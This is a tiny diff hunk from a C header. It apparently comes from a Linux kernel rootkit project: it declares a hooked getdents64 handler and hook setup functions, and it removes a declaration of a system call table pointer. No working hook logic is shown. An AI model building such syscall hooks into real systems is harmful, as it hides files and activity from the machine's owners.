@@ -68,6 +68,4 @@ asmlinkage int n_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, un
 void init_hooks(void);
 void exit_hooks(void);
 
-extern unsigned long *sct;
-
 #endif
